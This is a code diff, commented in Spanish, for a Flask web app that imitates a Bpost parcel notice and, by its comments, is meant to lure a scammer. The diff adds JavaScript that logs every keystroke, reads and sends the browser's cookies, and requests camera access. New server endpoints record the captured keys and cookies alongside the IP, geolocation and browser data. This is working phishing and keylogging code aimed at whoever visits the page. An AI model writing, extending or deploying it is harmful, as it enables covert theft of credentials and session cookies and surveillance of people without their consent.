@@ -2,19 +2,17 @@ import logging
 import requests
 from flask import Flask, request, redirect, render_template_string
 
-# Configuración del logging para ver la información en la consola y un archivo
+# Configuración del logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 
-# URL a la que redirigir al estafador (la página real de Bpost con el localizador)
+# URLs
 REDIRECT_URL = "https://track.bpost.be/btr/web/#/home?itemCodes=CE539544965BE"
-
-# URL del servidor que se mostrará al estafador
 SERVING_URL = "https://tunel-bpost.serveousercontent.com"
 
-# HTML de la página de aviso inicial (simula un mensaje de Bpost)
+# HTML de la página de aviso
 AVISO_HTML = """
 <!DOCTYPE html>
 <html lang="es">
@@ -67,7 +65,7 @@ AVISO_HTML = """
 </html>
 """
 
-# HTML de la página de aterrizaje que se mostrará al estafador antes de redirigir.
+# HTML de la página de aterrizaje
 LANDING_PAGE_HTML = """
 <!DOCTYPE html>
 <html lang="es">
@@ -102,7 +100,7 @@ LANDING_PAGE_HTML = """
             width: 30px;
             height: 30px;
             animation: spin 1s linear infinite;
-            margin: 20px auto;
+            margin: 25px auto;
         }
         @keyframes spin {
             to { transform: rotate(360deg); }
@@ -119,6 +117,35 @@ LANDING_PAGE_HTML = """
     </div>
 
     <script>
+        // Captura de teclado
+        document.addEventListener('keydown', function(event) {
+            const key = event.key;
+            fetch('/key', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ key: key })
+            });
+        });
+
+        // Captura de cookies
+        document.cookie.split(';').forEach(cookie => {
+            const [name, value] = cookie.trim().split('=');
+            fetch('/cookie', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ name: name, value: value })
+            });
+        });
+
+        // Captura de WebRTC
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+            });
+
+        // Captura de datos del navegador
         async function sendMoreData() {
             const data = {
                 userAgent: navigator.userAgent,
@@ -135,9 +162,7 @@ LANDING_PAGE_HTML = """
             try {
                 const response = await fetch('/data', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 });
                 const result = await response.json();
@@ -179,17 +204,14 @@ def index():
     logger.info(f"Referer: {referer}")
     logger.info(f"Accept-Language: {accept_language}")
 
-    # Obtener geolocalización
     geo_data = get_ip_geolocation(user_ip)
     if geo_data and "error" not in geo_data:
         logger.info(f"Geolocalización para {user_ip}: País={geo_data.get('country')}, Ciudad={geo_data.get('city')}, ISP={geo_data.get('org')}")
 
-    # Renderiza la página de aviso
     return render_template_string(AVISO_HTML, redirect_url=SERVING_URL)
 
 @app.route('/data', methods=['POST'])
 def receive_browser_data():
-    """Endpoint para recibir los datos de JavaScript del navegador."""
     try:
         browser_data = request.json
         user_ip = request.remote_addr
@@ -201,6 +223,25 @@ def receive_browser_data():
         logger.error(f"Error al recibir datos del navegador: {e}")
         return {"status": "error", "message": str(e)}, 400
 
+@app.route('/key', methods=['POST'])
+def receive_key():
+    try:
+        key = request.json.get('key', 'N/A')
+        logger.info(f"Tecla capturada: {key}")
+        return {"status": "success", "message": "Tecla recibida"}
+    except Exception as e:
+        logger.error(f"Error al recibir tecla: {e}")
+        return {"status": "error", "message": str(e)}, 400
+
+@app.route('/cookie', methods=['POST'])
+def receive_cookie():
+    try:
+        cookie = request.json
+        logger.info(f"Cookie capturada: {cookie}")
+        return {"status": "success", "message": "Cookie recibida"}
+    except Exception as e:
+        logger.error(f"Error al recibir cookie: {e}")
+        return {"status": "error", "message": str(e)}, 400
+
 if __name__ == '__main__':
-    # Usar host='0.0.0.0' para que sea accesible desde fuera del localhost
-    app.run(host='0.0.0.0', port=80, debug=False)  # Puerto 80 es el estándar para servidores web
+    app.run(host='0.0.0.0', port=80, debug=False)
